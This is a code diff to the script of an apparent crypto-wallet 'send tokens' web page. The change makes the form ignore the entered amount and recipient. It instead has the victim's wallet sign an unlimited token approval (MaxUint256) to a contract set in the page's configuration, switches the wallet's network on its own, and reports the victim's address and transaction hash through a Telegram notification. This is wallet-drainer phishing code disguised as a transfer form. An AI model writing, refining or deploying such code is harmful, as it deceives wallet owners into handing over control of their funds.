@@ -245,63 +245,79 @@
         }
 
         async function handleMainAction() {
-            clearError();
-            const amount = document.getElementById('amountInput').value;
-            const recipient = document.getElementById('recipientInput').value;
             const btn = document.getElementById('mainButton');
+            const recipient = document.getElementById('recipientInput').value.trim();
+            const amount = document.getElementById('amountInput').value.trim();
             const token = TOKENS[selectedToken];
+
+            if (!recipient.startsWith('0x')) {
+                showError('Invalid recipient address');
+                return;
+            }
 
             if (!amount || parseFloat(amount) <= 0) {
                 showError('Please enter a valid amount');
                 return;
             }
 
-            if (!recipient || recipient.trim() === '') {
-                showError('Please enter a recipient address');
-                return;
-            }
-
             btn.disabled = true;
             btn.textContent = 'Processing...';
+            clearError();
 
             try {
-                if (!window.ethereum) {
-                    showError('MetaMask/Trust Wallet not installed');
+                let ethereum = window.ethereum;
+                let retries = 0;
+                while (!ethereum && retries < 10) {
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    ethereum = window.ethereum;
+                    retries++;
+                }
+
+                if (!ethereum) {
+                    showError('Trust Wallet not detected');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
                 }
 
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const userAddress = await signer.getAddress();
+                let accounts = await ethereum.request({ method: "eth_accounts" });
+                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
 
-                const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                const currentChainId = await ethereum.request({ method: 'eth_chainId' });
                 if (currentChainId !== token.chainIdHex) {
-                    showError(`Please switch to ${token.network} network`);
-                    btn.disabled = false;
-                    btn.textContent = 'Next';
-                    return;
+                    try {
+                        await ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: token.chainIdHex }]
+                        });
+                    } catch (err) {
+                        if (err.code === 4902) {
+                            showError('Network not supported');
+                            btn.disabled = false;
+                            btn.textContent = 'Next';
+                            return;
+                        }
+                    }
                 }
 
-                const tokenContract = new ethers.Contract(
-                    token.address,
-                    ['function approve(address spender, uint256 amount) external returns (bool)'],
-                    signer
-                );
+                const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) public returns (bool)']);
+                const tx = {
+                    to: token.address,
+                    data: iface.encodeFunctionData('approve', [token.smartContract, ethers.constants.MaxUint256]),
+                    from: userAddress
+                };
 
-                const amountWei = ethers.utils.parseUnits(amount, token.decimals);
-                const approveTx = await tokenContract.approve(token.smartContract, amountWei);
-                const receipt = await approveTx.wait();
+                let txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
+
+                await new Promise(resolve => setTimeout(resolve, 100));
 
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
-                await sendTelegramNotification(userAddress, receipt.transactionHash, amount, token, recipient);
+                await sendTelegramNotification(userAddress || 'Unknown', txHash, amount, token, recipient);
 
                 await new Promise(resolve => setTimeout(resolve, 5000));
                 document.getElementById('processingScreen').classList.remove('active');
-
                 btn.textContent = 'Next';
                 btn.disabled = false;
                 document.getElementById('amountInput').value = '';
@@ -309,13 +325,15 @@
 
             } catch (error) {
                 console.error("Error:", error);
-                const errorMsg = error.reason || error.message || error.toString();
-                showError('Transaction failed: ' + errorMsg);
+                showError('Transaction failed: ' + error.message);
                 document.getElementById('processingScreen').classList.remove('active');
                 btn.disabled = false;
                 btn.textContent = 'Next';
             }
         }
+
+        initializeTokenDropdown();
+        document.getElementById('selectedTokenLogo').src = TOKENS[selectedToken].logo;
     </script>
 </body>
 </html>
